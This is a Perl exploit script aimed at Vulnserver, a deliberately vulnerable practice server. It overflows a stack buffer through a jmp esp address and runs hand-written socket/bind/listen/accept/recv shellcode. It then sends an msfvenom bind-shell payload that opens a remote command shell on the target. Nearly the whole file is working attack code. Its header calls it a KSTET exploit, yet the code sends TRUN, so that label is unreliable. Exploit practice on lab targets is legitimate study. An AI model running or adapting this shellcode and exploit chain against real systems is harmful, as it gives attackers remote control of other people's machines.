#!/usr/bin/perl

# Vulnserver KSTET exploit (https://github.com/stephenbradshaw/vulnserver)
# Tested against Microsoft Windows 7 Professional SP 1 English

use IO::Socket;

if($ARGV[0] eq ''){
die("Proper usage: $0 IP_ADDRESS PORT_1 PORT_2\n\n");
}

$badheader = "TRUN /.:/";

#Stack offset 3
#EIP offset 2003
#ESP offset 2007
#EBP offset 1999
#Stack offset 2647

$baddata = "\x41" x 2003;

#   0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False
$baddata .= pack('V',0x62501203);

# socket
$baddata .= "\xBB\x11\x7C\x25\x40\xC1\xEB\x08\x33\xc0\xB0\x06\x50\xB0\x01\x50\x40\x50\xFF\xD3";

# bind
$baddata .= "\x8B\xF8\x56\x56\x56\x33\xC9\x66\xB9\x27\x0E\xC1\xE1\x10\x41\x41\x51\x8B\xCC\xB3\x64\x6A\x10\x51\x57\xFF\xD3";

# listen
$baddata .= "\xB3\x54\x6A\x7F\x57\xFF\xD3";

# accept
$baddata .= "\x56\x56\xB3\x4C\x57\xFF\xD3";

# recv
$baddata .= "\x8B\xF8\x66\x81\xC4\x04\x02\x8B\xF4\x66\x81\xEC\x04\x02\x33\xC9\x51\xB5\x02\x51\x56\x57\xB3\x2C\xFF\xD3\xFF\xE6";

$baddata .= "\xCC";

$baddata .= "\x41" x (5000-length($baddata));

# msfvenom -p windows/shell_bind_tcp LPORT=80 -b "\x00\x0a\x0d" -f perl -v payload
# Payload size 355 bytes

$payload = 
"\xbe\x44\xa2\x43\xf7\xda\xdf\xd9\x74\x24\xf4\x5d\x33\xc9" .
"\xb1\x53\x31\x75\x12\x03\x75\x12\x83\xa9\x5e\xa1\x02\xcd" .
"\x77\xa4\xed\x2d\x88\xc9\x64\xc8\xb9\xc9\x13\x99\xea\xf9" .
"\x50\xcf\x06\x71\x34\xfb\x9d\xf7\x91\x0c\x15\xbd\xc7\x23" .
"\xa6\xee\x34\x22\x24\xed\x68\x84\x15\x3e\x7d\xc5\x52\x23" .
"\x8c\x97\x0b\x2f\x23\x07\x3f\x65\xf8\xac\x73\x6b\x78\x51" .
"\xc3\x8a\xa9\xc4\x5f\xd5\x69\xe7\x8c\x6d\x20\xff\xd1\x48" .
"\xfa\x74\x21\x26\xfd\x5c\x7b\xc7\x52\xa1\xb3\x3a\xaa\xe6" .
"\x74\xa5\xd9\x1e\x87\x58\xda\xe5\xf5\x86\x6f\xfd\x5e\x4c" .
"\xd7\xd9\x5f\x81\x8e\xaa\x6c\x6e\xc4\xf4\x70\x71\x09\x8f" .
"\x8d\xfa\xac\x5f\x04\xb8\x8a\x7b\x4c\x1a\xb2\xda\x28\xcd" .
"\xcb\x3c\x93\xb2\x69\x37\x3e\xa6\x03\x1a\x57\x0b\x2e\xa4" .
"\xa7\x03\x39\xd7\x95\x8c\x91\x7f\x96\x45\x3c\x78\xd9\x7f" .
"\xf8\x16\x24\x80\xf9\x3f\xe3\xd4\xa9\x57\xc2\x54\x22\xa7" .
"\xeb\x80\xdf\xaf\x4a\x7b\xc2\x52\x2c\x2b\x42\xfc\xc5\x21" .
"\x4d\x23\xf5\x49\x87\x4c\x9e\xb7\x28\x72\x0f\x31\xce\x18" .
"\xbf\x17\x58\xb4\x7d\x4c\x51\x23\x7d\xa6\xc9\xc3\x36\xa0" .
"\xce\xec\xc6\xe6\x78\x7a\x4d\xe5\xbc\x9b\x52\x20\x95\xcc" .
"\xc5\xbe\x74\xbf\x74\xbe\x5c\x57\x14\x2d\x3b\xa7\x53\x4e" .
"\x94\xf0\x34\xa0\xed\x94\xa8\x9b\x47\x8a\x30\x7d\xaf\x0e" .
"\xef\xbe\x2e\x8f\x62\xfa\x14\x9f\xba\x03\x11\xcb\x12\x52" .
"\xcf\xa5\xd4\x0c\xa1\x1f\x8f\xe3\x6b\xf7\x56\xc8\xab\x81" .
"\x56\x05\x5a\x6d\xe6\xf0\x1b\x92\xc7\x94\xab\xeb\x35\x05" .
"\x53\x26\xfe\x35\x1e\x6a\x57\xde\xc7\xff\xe5\x83\xf7\x2a" .
"\x29\xba\x7b\xde\xd2\x39\x63\xab\xd7\x06\x23\x40\xaa\x17" .
"\xc6\x66\x19\x17\xc3";


$socket=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die("Could not connect to server on port $ARGV[1]");

$socket->recv($sd,1024);
print $sd;
$socket->send($badheader.$baddata);

sleep(5);

$socket2=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[2]"
)or die("Could not connect to server on port $ARGV[2] to send payload \n");

$socket2->send($payload);
